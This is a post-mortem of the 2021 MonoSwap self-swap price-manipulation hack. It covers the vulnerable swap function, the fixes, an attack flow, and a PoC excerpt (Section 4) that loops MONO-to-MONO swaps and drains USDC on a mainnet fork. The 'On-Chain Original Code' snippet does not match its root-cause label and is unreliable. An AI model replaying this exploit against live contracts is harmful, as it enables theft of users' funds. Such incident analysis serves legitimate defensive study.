# MonoSwap — MONO Token Self-Swap Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2021-11-30 |
| **Protocol** | MonoSwap (MonoX) |
| **Chain** | Ethereum |
| **Loss** | ~$31,000,000 |
| **Attacker** | Address unconfirmed |
| **Attack Tx** | Address unconfirmed (fork block: 13,715,025) |
| **Vulnerable Contract** | [0xC36a7887786389405EA8DA0B87602Ae3902B88A1](https://etherscan.io/address/0xC36a7887786389405EA8DA0B87602Ae3902B88A1) (Monoswap) |
| **Root Cause** | `swapExactTokenForToken(MONO→MONO)` self-swap was permitted, inflating the MONO price indefinitely before draining USDC |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-11/Mono_exp.sol) |

---
## 1. Vulnerability Overview

MonoSwap is an AMM that uses single-token liquidity pools (vCash-based). It permitted `swapExactTokenForToken(MONO, MONO, ...)` — i.e., a self-swap where `tokenIn` and `tokenOut` are identical. In this case, simultaneously selling and buying MONO caused the internal price to rise abnormally. The attacker repeated this self-swap 55 times to inflate the MONO price hundreds of times over, then used the inflated MONO as collateral to withdraw large amounts of USDC.

---
## 2. Vulnerable Code Analysis

### 2.1 swapExactTokenForToken() — tokenIn == tokenOut Permitted

```solidity
// ❌ Monoswap @ 0xC36a7887786389405EA8DA0B87602Ae3902B88A1
// Swap is permitted even when tokenIn and tokenOut are identical
function swapExactTokenForToken(
    address tokenIn,
    address tokenOut,
    uint256 amountIn,
    uint256 amountOutMin,
    address to,
    uint256 deadline
) external ensure(deadline) returns (uint256 amountOut) {
    // ❌ No check for tokenIn == tokenOut
    // Price calculation logic error on MONO → MONO swap
    // sell(MONO) then buy(MONO) → MONO price inflation effect

    PoolInfo storage tokenInPool = pools[tokenIn];
    PoolInfo storage tokenOutPool = pools[tokenOut];
    // When tokenIn == tokenOut, references the same storage slot
    // Abnormal price inflation depending on the order of price updates
}
```

**Fixed code**:
```solidity
// ✅ Mandatory check: tokenIn != tokenOut
function swapExactTokenForToken(
    address tokenIn,
    address tokenOut,
    uint256 amountIn,
    uint256 amountOutMin,
    address to,
    uint256 deadline
) external ensure(deadline) returns (uint256 amountOut) {
    require(tokenIn != tokenOut, "Monoswap: identical tokens");
    require(tokenIn != address(0) && tokenOut != address(0), "Monoswap: zero address");
    // ...
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**TransparentUpgradeableProxy.sol** — Entry point:
```solidity
// ❌ Root cause: swapExactTokenForToken(MONO→MONO) self-swap was permitted, inflating the MONO price indefinitely before draining USDC
    function admin() external ifAdmin returns (address admin_) {
        admin_ = _getAdmin();
    }
```

## 3. Attack Flow

```
┌────────────────────────────────────────────────────────────┐
│ Step 1: Initial swap of 0.1 WETH → MONO                   │
│ monoswap.swapExactTokenForToken(WETH, MONO, 0.1e18, ...)  │
│ Monoswap @ 0xC36a7887786389405EA8DA0B87602Ae3902B88A1    │
└─────────────────────┬──────────────────────────────────────┘
                      │
┌─────────────────────▼──────────────────────────────────────┐
│ Step 2: Force-remove liquidity from 3 users               │
│ monoswap.removeLiquidity(MONO, balance, user, 0, 1)        │
│ Shallow the liquidity pool                                 │
└─────────────────────┬──────────────────────────────────────┘
                      │
┌─────────────────────▼──────────────────────────────────────┐
│ Step 3: Add liquidity (attacker establishes position)      │
│ monoswap.addLiquidity(MONO, 196875656, address(this))      │
└─────────────────────┬──────────────────────────────────────┘
                      │
┌─────────────────────▼──────────────────────────────────────┐
│ Step 4: Repeat MONO→MONO self-swap 55 times               │
│ Swap_Mono_for_Mono_55_Times()                              │
│ Each call: swapExactTokenForToken(MONO, MONO, amount-1, ...)│
│ MONO price inflated hundreds of times                      │
└─────────────────────┬──────────────────────────────────────┘
                      │
┌─────────────────────▼──────────────────────────────────────┐
│ Step 5: Drain all USDC using inflated MONO                 │
│ monoswap.swapTokenForExactToken(MONO, USDC, monoBalance,   │
│   4_000_000_000_000, msg.sender, deadline)                 │
└────────────────────────────────────────────────────────────┘
```

---
## 4. PoC Code (DeFiHackLabs)

```solidity
// testExploit() — mainnet fork block 13,715,025
function testExploit() public {
    mono.approve(Monoswap_address, type(uint256).max);

    // Initial swap of 0.1 WETH → MONO
    monoswap.swapExactTokenForToken(WETH9_Address, Mono_Token_Address, 0.1 ether, 1, address(this), block.timestamp);

    // Force-remove liquidity from 3 users
    RemoveLiquidity_From_3_Users();

    // Attacker adds liquidity
    monoswap.addLiquidity(Mono_Token_Address, 196_875_656, address(this));

    // MONO→MONO self-swap 55 times — price manipulation
    Swap_Mono_for_Mono_55_Times();

    // Drain all USDC using inflated MONO
    Swap_Mono_For_USDC();

    emit log_named_uint("Exploit completed, USDC Balance", usdc.balanceOf(msg.sender));
}

function Swap_Mono_for_Mono_55_Times() internal {
    for (uint256 i = 0; i < 55; i++) {
        (,,,,,, uint256 poolAmount,,) = monoswap.pools(Mono_Token_Address);
        // MONO → MONO self-swap: tokenIn == tokenOut
        monoswap.swapExactTokenForToken(
            Mono_Token_Address,
            Mono_Token_Address,
            poolAmount - 1, 0, address(this), block.timestamp
        );
    }
}
```

---
## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | tokenIn == tokenOut self-swap permitted — unbounded price inflation | CRITICAL | CWE-20 |
| V-02 | Unauthorized forced liquidity removal (removeLiquidity targeting other users) permitted | CRITICAL | CWE-284 |

---
## 6. Remediation Recommendations

```solidity
// ✅ Add identical token check to swap function
// ✅ removeLiquidity callable only by LP holders

function swapExactTokenForToken(
    address tokenIn,
    address tokenOut,
    uint256 amountIn,
    uint256 amountOutMin,
    address to,
    uint256 deadline
) external ensure(deadline) returns (uint256 amountOut) {
    require(tokenIn != tokenOut, "Monoswap: IDENTICAL_ADDRESSES");
    // ...
}

function removeLiquidity(
    address token,
    uint256 liquidity,
    address to,
    uint256 minToken,
    uint256 minVCash
) external {
    // Callable only by LP holders (or approved addresses)
    require(
        monoXPool.balanceOf(msg.sender, _getPoolId(token)) >= liquidity,
        "Monoswap: insufficient LP balance"
    );
    // ...
}
```

---
## 7. Lessons Learned

- **Checking tokenIn == tokenOut in an AMM is the most fundamental validation.** Uniswap V2 enforces this explicitly (`require(token0 != token1)`).
- **Single-token liquidity pools can be more susceptible to price manipulation than standard AMMs.** The mathematical invariants of virtual counterpart (vCash)-based price calculations must be rigorously verified.
- **The 55-iteration attack was executed within a single transaction.** Limiting the number of repeated swaps or enforcing a price movement rate limit (circuit breaker) would be effective countermeasures.